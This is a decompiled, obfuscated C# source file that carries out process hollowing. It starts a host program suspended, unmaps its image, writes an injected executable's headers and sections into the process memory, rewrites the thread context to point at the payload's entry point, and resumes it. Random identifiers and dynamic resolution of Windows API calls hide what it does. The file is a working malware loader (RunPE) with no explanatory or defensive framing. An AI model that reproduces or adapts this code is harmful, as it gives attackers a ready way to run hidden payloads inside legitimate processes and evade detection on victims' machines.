using System;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
public sealed class ZccbMEuvLENtLcnDZSModFGuCTXrrXFSxUqzFCmlhZ
{
	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool EqZQyabzjTJcoAjzqEGvb(IntPtr vpkcrIdULetCpUvjwKPaoxSewcozCXXAA, uint[] Part2);

	public delegate uint rlvYSMRWCjoIwzGde(IntPtr vpkcrIdULetCpUvjwKPaoxSewcozCXXAA);

	public delegate uint nfxIxqLqpzmaPDIcfNWUNpXlYwATiKDuOxFFz(IntPtr vpkcrIdULetCpUvjwKPaoxSewcozCXXAA, IntPtr Part2);

	public delegate IntPtr OUhNopxDYqzzqaspZcvYNFtuRGMftnxwkALQTpjqXBrCyIhIKtWNnzCt(IntPtr vpkcrIdULetCpUvjwKPaoxSewcozCXXAA, IntPtr Part2, IntPtr Part3, int Part4, int Part5);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool kRjGqTkxyQvSqoulGyIZORs(IntPtr vpkcrIdULetCpUvjwKPaoxSewcozCXXAA, uint[] Part2);

	public delegate bool sMYdDlydxlPsaAjFoSZcHVIGsIYrMyUWsgHJlsKBSjqPeJzxPMXxZ(IntPtr vpkcrIdULetCpUvjwKPaoxSewcozCXXAA, IntPtr Part2, byte[] Part3, uint Part4, int Part5);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool LwVeuSCLjSRqpZfHdLftZNKGqNeLI(IntPtr vpkcrIdULetCpUvjwKPaoxSewcozCXXAA, IntPtr Part2, ref IntPtr Part3, int Part4, ref IntPtr Part5);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool ffJVqZNLRKWBQXTMlTfzbBfMGRaPxFkYSRxEmtgey(string vpkcrIdULetCpUvjwKPaoxSewcozCXXAA, StringBuilder Part2, IntPtr Part3, IntPtr Part4, [MarshalAs(UnmanagedType.Bool)] bool Part5, int Part6, IntPtr Part7, string Part8, byte[] Part9, IntPtr[] vpkcrIdULetCpUvjwKPaoxSewcozCXXAA0);

	private static EqZQyabzjTJcoAjzqEGvb eqZQyabzjTJcoAjzqEGvb_0 = cApKGbpnAcwDMdzlwpirbVouVwCr<EqZQyabzjTJcoAjzqEGvb>("kernel32", "SetThreadContext");

	private static rlvYSMRWCjoIwzGde rlvYSMRWCjoIwzGde_0 = cApKGbpnAcwDMdzlwpirbVouVwCr<rlvYSMRWCjoIwzGde>("kernel32", "ResumeThread");

	private static nfxIxqLqpzmaPDIcfNWUNpXlYwATiKDuOxFFz nfxIxqLqpzmaPDIcfNWUNpXlYwATiKDuOxFFz_0 = cApKGbpnAcwDMdzlwpirbVouVwCr<nfxIxqLqpzmaPDIcfNWUNpXlYwATiKDuOxFFz>("ntdll", "NtUnmapViewOfSection");

	private static OUhNopxDYqzzqaspZcvYNFtuRGMftnxwkALQTpjqXBrCyIhIKtWNnzCt ouhNopxDYqzzqaspZcvYNFtuRGMftnxwkALQTpjqXBrCyIhIKtWNnzCt_0 = cApKGbpnAcwDMdzlwpirbVouVwCr<OUhNopxDYqzzqaspZcvYNFtuRGMftnxwkALQTpjqXBrCyIhIKtWNnzCt>("kernel32", "VirtualAllocEx");

	private static kRjGqTkxyQvSqoulGyIZORs kRjGqTkxyQvSqoulGyIZORs_0 = cApKGbpnAcwDMdzlwpirbVouVwCr<kRjGqTkxyQvSqoulGyIZORs>("kernel32", "GetThreadContext");

	private static sMYdDlydxlPsaAjFoSZcHVIGsIYrMyUWsgHJlsKBSjqPeJzxPMXxZ sMYdDlydxlPsaAjFoSZcHVIGsIYrMyUWsgHJlsKBSjqPeJzxPMXxZ_0 = cApKGbpnAcwDMdzlwpirbVouVwCr<sMYdDlydxlPsaAjFoSZcHVIGsIYrMyUWsgHJlsKBSjqPeJzxPMXxZ>("kernel32", "WriteProcessMemory");

	private static LwVeuSCLjSRqpZfHdLftZNKGqNeLI lwVeuSCLjSRqpZfHdLftZNKGqNeLI_0 = cApKGbpnAcwDMdzlwpirbVouVwCr<LwVeuSCLjSRqpZfHdLftZNKGqNeLI>("kernel32", "ReadProcessMemory");

	private static ffJVqZNLRKWBQXTMlTfzbBfMGRaPxFkYSRxEmtgey ffJVqZNLRKWBQXTMlTfzbBfMGRaPxFkYSRxEmtgey_0 = cApKGbpnAcwDMdzlwpirbVouVwCr<ffJVqZNLRKWBQXTMlTfzbBfMGRaPxFkYSRxEmtgey>("kernel32", "CreateProcessA");

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr Handle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

	public static T cApKGbpnAcwDMdzlwpirbVouVwCr<T>(string WbecliY, string XHGyQGpUsMexkTRUixXocRSJOiIbFt)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref WbecliY), ref XHGyQGpUsMexkTRUixXocRSJOiIbFt), typeof(T));
	}

	public static bool wedkIhQoKzFNZIovsWHfjZhPIaSHyTH(byte[] TBJivkkpfccQCYTSjgxgG, string DInjXbRLMHpEHFyfnEwSsxExMkZzcfXV)
	{
		checked
		{
			try
			{
				IntPtr zero = IntPtr.Zero;
				IntPtr[] array = new IntPtr[4];
				byte[] part = new byte[68];
				int num = BitConverter.ToInt32(TBJivkkpfccQCYTSjgxgG, 60);
				int num2 = BitConverter.ToInt16(TBJivkkpfccQCYTSjgxgG, num + 6);
				IntPtr intPtr = new IntPtr(BitConverter.ToInt32(TBJivkkpfccQCYTSjgxgG, num + 84));
				if (ffJVqZNLRKWBQXTMlTfzbBfMGRaPxFkYSRxEmtgey_0(null, new StringBuilder(DInjXbRLMHpEHFyfnEwSsxExMkZzcfXV), zero, zero, Part5: false, 4, zero, null, part, array))
				{
					uint[] array2 = new uint[179];
					array2[0] = 65538u;
					if (kRjGqTkxyQvSqoulGyIZORs_0(array[1], array2))
					{
						IntPtr part2 = new IntPtr(unchecked((long)array2[41]) + 8L);
						IntPtr Part = IntPtr.Zero;
						IntPtr intPtr2 = new IntPtr(4);
						IntPtr Part2 = IntPtr.Zero;
						if ((lwVeuSCLjSRqpZfHdLftZNKGqNeLI_0(array[0], part2, ref Part, (int)intPtr2, ref Part2) && unchecked((long)nfxIxqLqpzmaPDIcfNWUNpXlYwATiKDuOxFFz_0(array[0], Part)) == 0L) ? true : false)
						{
							IntPtr part3 = new IntPtr(BitConverter.ToInt32(TBJivkkpfccQCYTSjgxgG, num + 52));
							IntPtr part4 = new IntPtr(BitConverter.ToInt32(TBJivkkpfccQCYTSjgxgG, num + 80));
							IntPtr part5 = ouhNopxDYqzzqaspZcvYNFtuRGMftnxwkALQTpjqXBrCyIhIKtWNnzCt_0(array[0], part3, part4, 12288, 64);
							int part6 = default(int);
							sMYdDlydxlPsaAjFoSZcHVIGsIYrMyUWsgHJlsKBSjqPeJzxPMXxZ_0(array[0], part5, TBJivkkpfccQCYTSjgxgG, (uint)(int)intPtr, part6);
							int num3 = num2 - 1;
							int num4 = num3;
							int num5 = 0;
							while (true)
							{
								int num6 = num5;
								int num7 = num4;
								if (num6 > num7)
								{
									break;
								}
								int[] array3 = new int[10];
								Buffer.BlockCopy(TBJivkkpfccQCYTSjgxgG, num + 248 + num5 * 40, array3, 0, 40);
								byte[] array4 = new byte[array3[4] - 1 + 1];
								Buffer.BlockCopy(TBJivkkpfccQCYTSjgxgG, array3[5], array4, 0, array4.Length);
								part4 = new IntPtr(part5.ToInt32() + array3[3]);
								part3 = new IntPtr(array4.Length);
								sMYdDlydxlPsaAjFoSZcHVIGsIYrMyUWsgHJlsKBSjqPeJzxPMXxZ_0(array[0], part4, array4, (uint)(int)part3, part6);
								num5++;
							}
							part4 = new IntPtr(unchecked((long)array2[41]) + 8L);
							part3 = new IntPtr(4);
							sMYdDlydxlPsaAjFoSZcHVIGsIYrMyUWsgHJlsKBSjqPeJzxPMXxZ_0(array[0], part4, BitConverter.GetBytes(part5.ToInt32()), (uint)(int)part3, part6);
							array2[44] = (uint)(part5.ToInt32() + BitConverter.ToInt32(TBJivkkpfccQCYTSjgxgG, num + 40));
							eqZQyabzjTJcoAjzqEGvb_0(array[1], array2);
						}
					}
					rlvYSMRWCjoIwzGde_0(array[1]);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
			return true;
		}
	}
}
